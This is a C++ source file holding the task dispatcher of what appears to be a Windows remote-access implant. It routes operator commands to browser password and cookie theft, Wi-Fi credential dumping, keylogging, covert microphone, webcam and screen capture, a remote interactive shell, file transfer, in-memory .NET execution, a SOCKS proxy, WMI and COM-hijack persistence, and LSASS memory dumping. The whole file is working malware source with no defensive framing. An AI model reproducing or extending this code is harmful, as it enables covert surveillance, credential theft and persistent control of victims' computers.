#include "TaskDispatcher.h"
#include "Beacon.h"
#include "../recon/SysInfo.h"
#include "../recon/InstalledSoftware.h"
#include "../wifi/WifiDumper.h"
#include "../credential/ChromiumStealer.h"
#include "../credential/FirefoxStealer.h"
#include "../capture/Screenshot.h"
#include "../capture/Keylogger.h"
#include "../capture/Audio.h"
#include "../capture/Webcam.h"
#include "../streaming/Streamer.h"
#include "../shell/InteractiveShell.h"
#include "../execution/DotNetExecutor.h"
#include "../persistence/WmiPersistence.h"
#include "../persistence/ComHijacker.h"
#include "../credential/LsassDumper.h"
#include "../fs/FileSystem.h"
#include "../recon/DeepRecon.h"
#include "../crypto/Base64.h"
#include "../utils/Logger.h"
#include <stdexcept>
#include <sstream>
#include <filesystem>
#include <algorithm>

namespace beacon {

TaskDispatcher::TaskDispatcher(moodycamel::ConcurrentQueue<Result>& pendingResults)
    : pendingResults_(pendingResults) {}

void TaskDispatcher::dispatch(const Task& task) {
    LOG_DEBUG("Dispatching task " + task.task_id + "...");
    // Each thread must initialize COM to use WMI/COM modules
    HRESULT hrCom = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    
    Result result;
    result.task_id = task.task_id;

    try {
        switch (task.type) {
            case TaskType::SYSINFO:
                result.output = "sysinfo:" + recon::getSysInfo();
                break;
            case TaskType::INSTALLED_APPS:
                result.output = "APPS_ENUM:" + recon::getInstalledSoftware();
                break;
            case TaskType::WIFI_DUMP: {
                // Send scan results as a separate result to match server's WIFI_SCAN handler
                Result scanRes;
                scanRes.task_id = result.task_id + "_scan";
                scanRes.output = "WIFI_SCAN:" + wifi::scanAvailableWifi();
                pendingResults_.enqueue(scanRes);

                result.output = "WIFI_DUMP:" + wifi::dumpWifiProfiles();
                break;
            }
            case TaskType::BROWSER_PASS:
                result.output = "BROWSER_PASS:" + credential::DumpChromiumPasswords();
                result.output += "\n\n" + credential::DumpFirefoxPasswords();
                break;
            case TaskType::COOKIE_STEAL:
                result.output = "COOKIES:" + credential::StealFirefoxCookies(); 
                break;
            case TaskType::SCREENSHOT: {
                std::vector<BYTE> jpg = capture::CaptureScreenshotJPEG();
                if (jpg.empty()) throw std::runtime_error("Screenshot capture failed");
                result.output = "SCREENSHOT:" + crypto::Base64Encode(jpg);
                break;
            }
            case TaskType::KEYLOG:
                if (task.cmd == "start") {
                    capture::StartKeylogger();
                    result.output = "Keylogger started";
                } else if (task.cmd == "stop") {
                    capture::StopKeylogger();
                    result.output = "Keylogger stopped";
                } else if (task.cmd == "dump") {
                    result.output = capture::GetAndClearKeylog();
                }
                break;
            case TaskType::MIC: {
                int seconds = 5;
                try { seconds = std::stoi(task.cmd); } catch(...) {}
                std::vector<BYTE> wav = capture::RecordAudio(seconds);
                result.output = "AUDIO:" + crypto::Base64Encode(wav);
                break;
            }
            case TaskType::LIST_WEBCAMS: {
                auto json = capture::ListWebcamDevices();
                result.output = "WEBCAM_LIST:" + json.dump();
                break;
            }
            case TaskType::WEBCAM: {
                int camIndex = 0;
                std::string nameHint;
                if (!task.cmd.empty()) {
                    size_t colon_pos = task.cmd.find(':');
                    if (colon_pos != std::string::npos) {
                        std::string index_str = task.cmd.substr(0, colon_pos);
                        try {
                            camIndex = std::stoi(index_str);
                        } catch (...) {
                            // ignore, camIndex remains 0
                        }
                        nameHint = task.cmd.substr(colon_pos + 1);
                    } else {
                        try {
                           if (std::all_of(task.cmd.begin(), task.cmd.end(), ::isdigit)) {
                                camIndex = std::stoi(task.cmd);
                           } else {
                                nameHint = task.cmd;
                           }
                        } catch (...) {
                            nameHint = task.cmd;
                        }
                    }
                }
                LOG_DEBUG("Attempting webcam capture with index=" + std::to_string(camIndex) + ", hint='" + nameHint + "'");
                std::vector<BYTE> img = capture::CaptureWebcamJPEG(camIndex, nameHint);
                if (img.empty()) result.error = "Webcam capture failed (or camera not found)";
                else result.output = "WEBCAM:" + crypto::Base64Encode(img);
                break;
            }
            case TaskType::SCREEN_STREAM: {
                // Cmd: "start [duration]" or "stop"
                std::string cmd = task.cmd;
                if (cmd.find("start") == 0) {
                    int duration = 0;
                    try {
                        size_t space = cmd.find(' ');
                        if (space != std::string::npos) duration = std::stoi(cmd.substr(space + 1));
                    } catch(...) {}
                    
                    // define callback
                    auto cb = [this](const std::string& tid, const std::string& out) {
                         Result r; r.task_id = tid; r.output = out;
                         this->pendingResults_.enqueue(r);
                    };
                    streaming::StartScreenStream(duration, task.task_id, cb);
                    result.output = "SCREEN_STREAM_STATUS:Screen stream started";
                } else if (cmd == "stop") {
                    streaming::StopScreenStream();
                    result.output = "SCREEN_STREAM_STATUS:Screen stream stopped";
                }
                break;
            }
            case TaskType::WEBCAM_STREAM: {
                 std::string cmd = task.cmd;
                if (cmd.rfind("start", 0) == 0) {
                    int duration = 0;
                    int camIndex = 0;
                    std::string nameHint;

                    std::stringstream ss(cmd);
                    std::string token;
                    ss >> token; // "start"

                    if (ss >> token) {
                        try { duration = std::stoi(token); } catch(...) {}
                    }

                    if (ss >> token) {
                        size_t colon_pos = token.find(':');
                        if (colon_pos != std::string::npos) {
                            try { camIndex = std::stoi(token.substr(0, colon_pos)); } catch(...) {}
                            nameHint = token.substr(colon_pos + 1);
                        } else {
                            if (std::all_of(token.begin(), token.end(), ::isdigit)) {
                                try { camIndex = std::stoi(token); } catch(...) {}
                            } else {
                                nameHint = token;
                            }
                        }
                    }

                    auto cb = [this](const std::string& tid, const std::string& out) {
                         Result r; r.task_id = tid; r.output = out;
                         this->pendingResults_.enqueue(r);
                    };
                    streaming::StartWebcamStream(duration, task.task_id, cb, camIndex, nameHint);
                    result.output = "WEBCAM_STREAM_STATUS:Webcam stream started";
                } else if (cmd == "stop") {
                    streaming::StopWebcamStream();
                    result.output = "WEBCAM_STREAM_STATUS:Webcam stream stopped";
                }
                break;
            }
            case TaskType::ISHELL: {
                if (task.cmd == "start") {
                    auto cb = [this](const std::string& out) {
                        Result r; 
                        r.task_id = "ishell_out"; 
                        r.output = "ISHELL_OUTPUT:\n" + out;
                        this->pendingResults_.enqueue(r);
                    };
                    shell::StartShell(cb);
                    result.output = "ISHELL_STATUS:Interactive shell started";
                } else if (task.cmd == "exit") {
                    shell::StopShell();
                    result.output = "ISHELL_STATUS:Interactive shell terminated";
                } else {
                    // It's a command input
                    if (shell::IsShellRunning()) {
                        shell::WriteToShell(task.cmd);
                        // Output comes via callback asynchronously
                        result.output = "ISHELL_OUTPUT:"; // Ack
                    } else {
                        result.error = "Shell not started";
                    }
                }
                break;
            }
            case TaskType::DEEP_RECON:
                result.output = recon::GetDeepRecon();
                break;
            case TaskType::BROWSE_FS:
                result.output = fs::Browse(task.cmd);
                break;
            case TaskType::FILE_DOWNLOAD: {
                std::vector<BYTE> data = fs::ReadFileBinary(task.cmd);
                if (data.empty()) result.error = "File not found or empty";
                else {
                    result.output = "FILE_DOWNLOAD:" + std::string(std::filesystem::path(task.cmd).filename().string()) + ":" + crypto::Base64Encode(data);
                }
                break;
            }
            case TaskType::FILE_UPLOAD: {
                // Cmd format: "path:base64data"
                size_t colon = task.cmd.find(':');
                if (colon != std::string::npos) {
                    std::string path = task.cmd.substr(0, colon);
                    std::string b64 = task.cmd.substr(colon + 1);
                    std::vector<BYTE> data = crypto::Base64Decode(b64);
                    if (fs::WriteFileBinary(path, data)) {
                        result.output = "Uploaded " + path;
                    } else {
                        result.error = "Failed to write file";
                    }
                } else {
                    result.error = "Invalid upload command format";
                }
                break;
            }
            case TaskType::EXECUTE_ASSEMBLY: {
                // Cmd format: "b64_assembly:arg1 arg2 arg3"
                size_t colon = task.cmd.find(':');
                if (colon != std::string::npos) {
                    std::string b64 = task.cmd.substr(0, colon);
                    std::string argsStr = task.cmd.substr(colon + 1);
                    
                    std::vector<uint8_t> assembly = crypto::Base64Decode(b64);
                    
                    // Split args (simple space-split for now)
                    std::vector<std::wstring> args;
                    std::wstringstream ss(std::wstring(argsStr.begin(), argsStr.end()));
                    std::wstring arg;
                    while (ss >> arg) args.push_back(arg);

                    execution::DotNetExecutor executor;
                    result.output = executor.Execute(assembly, args);
                } else {
                    result.error = "Invalid execute-assembly format (expected b64:args)";
                }
                break;
            }
            case TaskType::SOCKS_PROXY: {
                // Cmd format: "start [port]" or "stop"
                if (task.cmd.find("start") == 0) {
                    int port = 1080;
                    try {
                        size_t space = task.cmd.find(' ');
                        if (space != std::string::npos) port = std::stoi(task.cmd.substr(space + 1));
                    } catch(...) {}
                    
                    if (m_socksProxy.Start(port)) {
                        result.output = "SOCKS_PROXY_STATUS:Started on port " + std::to_string(port);
                    } else {
                        result.error = "Failed to start SOCKS proxy (already running or port busy)";
                    }
                } else if (task.cmd == "stop") {
                    m_socksProxy.Stop();
                    result.output = "SOCKS_PROXY_STATUS:Stopped";
                }
                break;
            }
            case TaskType::ADV_PERSISTENCE: {
                // Cmd format: "wmi install [name]" or "com install [clsid]"
                std::string cmd = task.cmd;
                char implantPath[MAX_PATH];
                GetModuleFileNameA(NULL, implantPath, MAX_PATH);

                if (cmd.find("wmi install") == 0) {
                    std::string name = "BenninUpdate";
                    if (cmd.length() > 12) name = cmd.substr(12);
                    if (persistence::WmiPersistence::Install(implantPath, name))
                        result.output = "ADV_PERSISTENCE:WMI installed as " + name;
                    else result.error = "WMI install failed";
                } else if (cmd.find("com install") == 0) {
                    std::string clsid = "{00021400-0000-0000-C000-000000000046}"; // Folder Background
                    if (cmd.length() > 12) clsid = cmd.substr(12);
                    if (persistence::ComHijacker::Install(implantPath, clsid))
                        result.output = "ADV_PERSISTENCE:COM hijacking installed for " + clsid;
                    else result.error = "COM install failed";
                }
                break;
            }
            case TaskType::DUMP_LSASS: {
                std::vector<BYTE> dump = credential::LsassDumper::Dump();
                if (dump.empty()) result.error = "LSASS dump failed (admin/debug priv required)";
                else {
                    result.output = "FILE_DOWNLOAD:lsass.dmp:" + crypto::Base64Encode(dump);
                }
                break;
            }
            case TaskType::GET_LOGS:
                result.output = "LOGS:" + utils::Logger::GetRecentLogs(200);
                break;
            default:
                result.error = "Unknown or unsupported task type.";
                LOG_WARN("Unsupported task type received: " + task.task_id);
                break;
        }
        if (result.error.empty()) {
            LOG_INFO("Task " + task.task_id + " completed successfully.");
        } else {
            LOG_ERR("Task " + task.task_id + " failed: " + result.error);
        }
    } catch (const std::exception& e) {
        result.error = e.what();
        LOG_ERR("Exception in TaskDispatcher (" + task.task_id + "): " + std::string(e.what()));
    } catch (...) {
        result.error = "Unknown non-C++ exception occurred in dispatcher";
        LOG_ERR("Unknown non-C++ exception in TaskDispatcher (" + task.task_id + ")");
    }

    pendingResults_.enqueue(result);
    
    if (SUCCEEDED(hrCom)) {
        CoUninitialize();
    }
}

} // namespace beacon
